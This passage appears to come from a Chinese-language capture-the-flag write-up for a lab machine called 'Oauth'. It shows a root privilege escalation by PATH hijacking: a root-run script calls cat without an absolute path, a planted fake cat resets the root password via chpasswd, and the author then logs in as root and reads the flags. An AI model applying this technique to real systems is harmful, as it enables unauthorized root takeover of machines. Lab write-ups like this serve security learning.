+## 进程监控确认劫持目标
+
+执行 CheckSystem 的同时用进程监控抓以 UID=0 运行的子命令。
+
+```bash
+/opt/scripts/CheckSystem
+```
+
+```
+CMD: UID=0  PID=26704  | cat /var/mail/yepian/message.md
+CMD: UID=0  PID=26706  | ps -ef
+CMD: UID=0  PID=26708  | grep -v grep
+```
+
+CheckMail.sh 调了 `cat`，CheckServices.sh 调了 `ps` 和 `grep`，全部没写绝对路径。
+
+## PATH 劫持提权
+
+在 home 目录下创建恶意 `cat`，保存为 `~/cat`：
+
+```bash
+#!/bin/bash
+echo "root:root123" | chpasswd;
+echo "123456"
+```
+
+```bash
+chmod +x ~/cat
+PATH=~:$PATH /opt/scripts/CheckSystem
+```
+
+```
+Fetching Message...
+================================================
+= From:cxzlw   To:yepian =
+123456
+================================================
+Checking Services...
+KeyCloak Alive!
+WordPress Alive!
+```
+
+`cat` 被劫持，root 密码已改为 `root123`。
+
+```bash
+yepian@Oauth:~$ su -
+Password: root123
+root@Oauth:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+# Flag
+
+```bash
+root@Oauth:~# cat /home/yepian/user.txt /root/root.txt
+flag{user-UserFlag}
+flag{root-RootFlag}
+```
